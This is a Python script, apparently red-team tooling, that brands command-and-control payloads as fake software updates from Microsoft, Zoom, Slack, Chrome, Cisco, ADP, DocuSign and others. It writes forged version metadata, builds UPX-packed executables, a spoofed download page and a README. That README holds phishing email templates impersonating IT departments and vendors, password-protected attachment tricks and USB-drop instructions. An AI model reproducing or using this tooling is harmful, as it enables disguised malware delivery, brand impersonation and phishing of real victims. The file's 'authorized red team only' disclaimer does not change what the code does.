#!/usr/bin/env python3
"""
Payload Brander - Automate branded payload generation
For authorized red team operations only

Usage:
    python3 payload_brander.py --template zoom --c2-host 192.168.1.100 --c2-port 443
    python3 payload_brander.py --list-templates
    python3 payload_brander.py --custom --company "ACME Corp" --product "VPN Client"
"""

import os
import sys
import argparse
import subprocess
from datetime import datetime
from pathlib import Path

# Preset company templates for quick branding
TEMPLATES = {
    "microsoft": {
        "company": "Microsoft Corporation",
        "product": "Windows Security Update",
        "description": "Critical security update for Windows",
        "copyright": "Microsoft Corporation",
        "icon": "icons/windows.ico",
        "filename": f"Microsoft-Security-Update-{datetime.now().year}.exe",
        "version": "10.0.19045.3693"
    },
    "zoom": {
        "company": "Zoom Video Communications, Inc.",
        "product": "Zoom Client Update",
        "description": "Security and performance improvements for Zoom",
        "copyright": "Zoom Video Communications, Inc.",
        "icon": "icons/zoom.ico",
        "filename": "Zoom-Update-5.16.10.exe",
        "version": "5.16.10.0"
    },
    "teams": {
        "company": "Microsoft Corporation",
        "product": "Microsoft Teams Update",
        "description": "Microsoft Teams desktop client update",
        "copyright": "Microsoft Corporation",
        "icon": "icons/teams.ico",
        "filename": "Teams-Update-1.6.00.exe",
        "version": "1.6.0.0"
    },
    "slack": {
        "company": "Slack Technologies, LLC",
        "product": "Slack Desktop Update",
        "description": "Enhanced security and new features for Slack",
        "copyright": "Slack Technologies, LLC",
        "icon": "icons/slack.ico",
        "filename": "Slack-Update-4.35.126.exe",
        "version": "4.35.126.0"
    },
    "adp": {
        "company": "Automatic Data Processing, Inc.",
        "product": "ADP W-2 Document Viewer",
        "description": "Secure W-2 tax document viewer",
        "copyright": "Automatic Data Processing, Inc.",
        "icon": "icons/adp.ico",
        "filename": f"ADP-W2-Viewer-{datetime.now().year}.exe",
        "version": "2024.1.0.0"
    },
    "docusign": {
        "company": "DocuSign, Inc.",
        "product": "DocuSign Secure Document Reader",
        "description": "View and sign encrypted documents",
        "copyright": "DocuSign, Inc.",
        "icon": "icons/docusign.ico",
        "filename": "DocuSign-SecureReader.exe",
        "version": "6.8.0.0"
    },
    "webex": {
        "company": "Cisco Systems, Inc.",
        "product": "Cisco Webex Update",
        "description": "Security update for Webex Meetings",
        "copyright": "Cisco Systems, Inc.",
        "icon": "icons/webex.ico",
        "filename": "Webex-Update-43.10.exe",
        "version": "43.10.0.0"
    },
    "chrome": {
        "company": "Google LLC",
        "product": "Google Chrome Update",
        "description": "Critical security update for Google Chrome",
        "copyright": "Google LLC",
        "icon": "icons/chrome.ico",
        "filename": "Chrome-Security-Update.exe",
        "version": "119.0.6045.199"
    },
    "office": {
        "company": "Microsoft Corporation",
        "product": "Microsoft Office Update",
        "description": "Office 365 security and feature update",
        "copyright": "Microsoft Corporation",
        "icon": "icons/office.ico",
        "filename": "Office-Update-2024.exe",
        "version": "16.0.17029.20028"
    },
    "vpn-cisco": {
        "company": "Cisco Systems, Inc.",
        "product": "Cisco AnyConnect VPN Client",
        "description": "Cisco AnyConnect Secure Mobility Client",
        "copyright": "Cisco Systems, Inc.",
        "icon": "icons/cisco-vpn.ico",
        "filename": "CiscoAnyConnect-VPN-Client.exe",
        "version": "4.10.07073.0"
    }
}


class PayloadBrander:
    def __init__(self, workspace_root="/workspace"):
        self.workspace = Path(workspace_root)
        self.payload_dir = self.workspace / "native_payloads"
        self.output_dir = self.payload_dir / "output"
        self.icons_dir = self.workspace / "tools" / "icons"
        
        # Create directories if they don't exist
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.icons_dir.mkdir(parents=True, exist_ok=True)
    
    def list_templates(self):
        """List all available templates"""
        print("\n🎨 Available Templates:\n")
        print(f"{'Template':<15} {'Company':<40} {'Product':<30}")
        print("=" * 85)
        
        for name, info in TEMPLATES.items():
            print(f"{name:<15} {info['company']:<40} {info['product']:<30}")
        
        print(f"\n📦 Total: {len(TEMPLATES)} templates\n")
    
    def create_resource_file(self, template, output_file="resource.rc"):
        """Generate Windows resource file with branding metadata"""
        
        # Parse version string (e.g., "5.16.10.0" -> 5,16,10,0)
        version_parts = template['version'].split('.')
        while len(version_parts) < 4:
            version_parts.append('0')
        file_version = ','.join(version_parts[:4])
        
        rc_content = f"""// Resource file for {template['company']}
// Generated by Payload Brander

#include <windows.h>

// Icon
1 ICON "{template['icon']}"

// Version Information
1 VERSIONINFO
FILEVERSION     {file_version}
PRODUCTVERSION  {file_version}
FILEFLAGSMASK   0x3fL
FILEFLAGS       0x0L
FILEOS          VOS__WINDOWS32
FILETYPE        VFT_APP
FILESUBTYPE     VFT2_UNKNOWN
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"  // English (US)
        BEGIN
            VALUE "CompanyName",      "{template['company']}"
            VALUE "FileDescription",  "{template['description']}"
            VALUE "FileVersion",      "{template['version']}"
            VALUE "InternalName",     "{template['product'].replace(' ', '')}"
            VALUE "LegalCopyright",   "Copyright © {datetime.now().year} {template['copyright']}"
            VALUE "OriginalFilename", "{template['filename']}"
            VALUE "ProductName",      "{template['product']}"
            VALUE "ProductVersion",   "{template['version']}"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200  // English (US), Unicode
    END
END

// Manifest for Windows compatibility and UAC
1 RT_MANIFEST "manifest.xml"
"""
        
        output_path = self.payload_dir / "windows" / output_file
        output_path.parent.mkdir(parents=True, exist_ok=True)
        
        with open(output_path, 'w') as f:
            f.write(rc_content)
        
        print(f"✅ Resource file created: {output_path}")
        return output_path
    
    def create_manifest(self):
        """Create Windows manifest for compatibility"""
        manifest_content = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity
    type="win32"
    name="SecurityUpdate"
    version="1.0.0.0"
    processorArchitecture="*"/>
  
  <description>Security Update Application</description>
  
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
  
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <application>
      <!-- Windows 10 -->
      <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/>
      <!-- Windows 8.1 -->
      <supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/>
      <!-- Windows 8 -->
      <supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}"/>
      <!-- Windows 7 -->
      <supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}"/>
    </application>
  </compatibility>
  
  <application xmlns="urn:schemas-microsoft-com:asm.v3">
    <windowsSettings>
      <dpiAware xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</dpiAware>
    </windowsSettings>
  </application>
</assembly>
"""
        
        manifest_path = self.payload_dir / "windows" / "manifest.xml"
        with open(manifest_path, 'w') as f:
            f.write(manifest_content)
        
        print(f"✅ Manifest created: {manifest_path}")
        return manifest_path
    
    def build_payload(self, template, c2_host, c2_port, use_compression=True):
        """Build the branded payload"""
        
        print(f"\n🔨 Building branded payload for {template['company']}...")
        print(f"   C2: {c2_host}:{c2_port}")
        print(f"   Output: {template['filename']}")
        
        # 1. Create resource file
        self.create_resource_file(template)
        
        # 2. Create manifest
        self.create_manifest()
        
        # 3. Call the build script
        build_script = self.payload_dir / "windows" / "build_trusted_windows.sh"
        
        if not build_script.exists():
            print(f"❌ Build script not found: {build_script}")
            return False
        
        # Set environment variables for C2
        env = os.environ.copy()
        env['C2_HOST'] = c2_host
        env['C2_PORT'] = str(c2_port)
        env['OUTPUT_NAME'] = template['filename']
        env['USE_UPX'] = 'yes' if use_compression else 'no'
        
        try:
            result = subprocess.run(
                ['bash', str(build_script)],
                env=env,
                cwd=str(self.payload_dir / "windows"),
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                output_file = self.output_dir / template['filename']
                print(f"\n✅ Payload built successfully!")
                print(f"   Location: {output_file}")
                
                # Show file info
                if output_file.exists():
                    size = output_file.stat().st_size
                    print(f"   Size: {size:,} bytes ({size/1024:.1f} KB)")
                
                return True
            else:
                print(f"❌ Build failed!")
                print(f"   STDOUT: {result.stdout}")
                print(f"   STDERR: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"❌ Error during build: {e}")
            return False
    
    def generate_delivery_package(self, template, include_webpage=True):
        """Generate complete delivery package with landing page"""
        
        pkg_dir = self.output_dir / f"{template['filename']}-delivery-package"
        pkg_dir.mkdir(parents=True, exist_ok=True)
        
        print(f"\n📦 Generating delivery package...")
        
        # 1. Copy payload
        payload_src = self.output_dir / template['filename']
        payload_dst = pkg_dir / template['filename']
        
        if payload_src.exists():
            import shutil
            shutil.copy2(payload_src, payload_dst)
            print(f"   ✅ Payload: {template['filename']}")
        
        # 2. Create landing page
        if include_webpage:
            self._create_landing_page(pkg_dir, template)
        
        # 3. Create README
        self._create_delivery_readme(pkg_dir, template)
        
        print(f"\n✅ Delivery package created: {pkg_dir}")
        return pkg_dir
    
    def _create_landing_page(self, pkg_dir, template):
        """Create a professional-looking landing page"""
        
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{template['product']} - Download</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        
        .container {{
            background: white;
            padding: 50px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 600px;
            text-align: center;
        }}
        
        .logo {{
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: #4285F4;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
        }}
        
        h1 {{
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
        }}
        
        .company {{
            color: #666;
            margin-bottom: 30px;
            font-size: 16px;
        }}
        
        .description {{
            color: #555;
            line-height: 1.6;
            margin-bottom: 30px;
        }}
        
        .download-btn {{
            background: #4285F4;
            color: white;
            padding: 15px 40px;
            border: none;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-block;
        }}
        
        .download-btn:hover {{
            background: #357ae8;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(66,133,244,0.3);
        }}
        
        .info {{
            margin-top: 30px;
            padding-top: 30px;
            border-top: 1px solid #eee;
            color: #999;
            font-size: 14px;
        }}
        
        .version {{
            color: #666;
            margin-top: 10px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔒</div>
        <h1>{template['product']}</h1>
        <div class="company">{template['company']}</div>
        
        <div class="description">
            {template['description']}
        </div>
        
        <a href="{template['filename']}" class="download-btn" download>
            ⬇️ Download Update
        </a>
        
        <div class="info">
            <div class="version">Version {template['version']}</div>
            <div>Size: ~2.5 MB | Windows 7, 8, 10, 11</div>
        </div>
    </div>
</body>
</html>
"""
        
        html_path = pkg_dir / "index.html"
        with open(html_path, 'w') as f:
            f.write(html_content)
        
        print(f"   ✅ Landing page: index.html")
    
    def _create_delivery_readme(self, pkg_dir, template):
        """Create README for delivery package"""
        
        readme_content = f"""# Delivery Package: {template['product']}

## 📦 Contents

- `{template['filename']}` - Branded payload
- `index.html` - Professional landing page
- `README.md` - This file

## 🚀 Deployment Options

### Option 1: Email Attachment (Direct)

1. Compress payload in password-protected ZIP:
   ```bash
   7z a -p"SecurePass123" update.zip {template['filename']}
   ```

2. Email template:
   ```
   Subject: {template['product']} - Security Update
   
   A critical security update is available for {template['product']}.
   
   Download the attached update and install by [DATE].
   Password: SecurePass123
   
   The update includes important security improvements.
   ```

### Option 2: Hosted File (Recommended)

1. Upload `index.html` and `{template['filename']}` to web server

2. Send link via email:
   ```
   Download: https://updates.yourcompany.com/
   ```

3. Professional hosting options:
   - AWS S3 + CloudFront
   - Azure Blob Storage
   - DigitalOcean Spaces

### Option 3: USB Drop (Physical)

1. Copy files to branded USB drives
2. Add label: "{template['company']} - Important Update"
3. Place in high-traffic areas (parking lot, reception, break room)

## 📧 Email Templates

### Template A: IT Department
```
From: it-security@company.com
Subject: [ACTION REQUIRED] Security Update - Install by [DATE]

Hi Team,

A critical security update for {template['product']} has been released.

Please download and install: [LINK]

This update addresses recent vulnerabilities and must be installed
by [DATE] for compliance.

Thanks,
IT Security Team
```

### Template B: Vendor Update
```
From: support@{template['company'].lower().replace(' ', '').replace(',', '')}.com
Subject: Critical {template['product']} Security Patch

Dear Valued Customer,

{template['company']} has released an emergency security update
to protect against newly discovered vulnerabilities.

Download update: [LINK]

This update is not yet available through automatic updates and
must be installed manually.

Best regards,
{template['company']} Security Team
```

## ⚠️ IMPORTANT

**FOR AUTHORIZED RED TEAM OPERATIONS ONLY**

Before deploying:
- ✅ Written authorization obtained
- ✅ Scope clearly defined
- ✅ C2 infrastructure operational
- ✅ Emergency contacts established
- ✅ Deconfliction process in place

## 📊 Tracking

Monitor these metrics:
- Emails sent vs delivered
- Links clicked
- Files downloaded
- Payloads executed

Report all findings to the client per your agreement.

---

*Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}*
*Template: {template['company']}*
"""
        
        readme_path = pkg_dir / "README.md"
        with open(readme_path, 'w') as f:
            f.write(readme_content)
        
        print(f"   ✅ README: README.md")


def main():
    parser = argparse.ArgumentParser(
        description='Payload Brander - Build professionally branded payloads',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # List available templates
  python3 payload_brander.py --list-templates
  
  # Build Zoom-branded payload
  python3 payload_brander.py --template zoom --c2-host 192.168.1.100 --c2-port 443
  
  # Build with custom branding
  python3 payload_brander.py --custom --company "ACME Corp" --product "VPN Client" \\
                             --c2-host 10.0.0.5 --c2-port 8443
  
  # Generate complete delivery package
  python3 payload_brander.py --template microsoft --c2-host 192.168.1.50 \\
                             --c2-port 443 --delivery-package

For authorized red team operations only.
        """
    )
    
    parser.add_argument('--list-templates', action='store_true',
                       help='List all available templates')
    parser.add_argument('--template', choices=list(TEMPLATES.keys()),
                       help='Use a preset template')
    parser.add_argument('--custom', action='store_true',
                       help='Use custom branding')
    parser.add_argument('--company', help='Company name (for custom)')
    parser.add_argument('--product', help='Product name (for custom)')
    parser.add_argument('--c2-host', required=False,
                       help='C2 server host/IP')
    parser.add_argument('--c2-port', type=int, default=443,
                       help='C2 server port (default: 443)')
    parser.add_argument('--no-compression', action='store_true',
                       help='Skip UPX compression')
    parser.add_argument('--delivery-package', action='store_true',
                       help='Generate complete delivery package')
    
    args = parser.parse_args()
    
    brander = PayloadBrander()
    
    # List templates
    if args.list_templates:
        brander.list_templates()
        return 0
    
    # Validate required arguments
    if not args.template and not args.custom:
        parser.error("Either --template or --custom is required")
    
    if not args.c2_host:
        parser.error("--c2-host is required")
    
    # Select template
    if args.custom:
        if not args.company or not args.product:
            parser.error("--company and --product required with --custom")
        
        template = {
            "company": args.company,
            "product": args.product,
            "description": f"Update for {args.product}",
            "copyright": args.company,
            "icon": "icons/generic.ico",
            "filename": f"{args.product.replace(' ', '-')}.exe",
            "version": "1.0.0.0"
        }
    else:
        template = TEMPLATES[args.template]
    
    # Build payload
    success = brander.build_payload(
        template,
        args.c2_host,
        args.c2_port,
        use_compression=not args.no_compression
    )
    
    if not success:
        print("\n❌ Build failed!")
        return 1
    
    # Generate delivery package if requested
    if args.delivery_package:
        brander.generate_delivery_package(template)
    
    print("\n✅ Done!")
    return 0


if __name__ == "__main__":
    sys.exit(main())
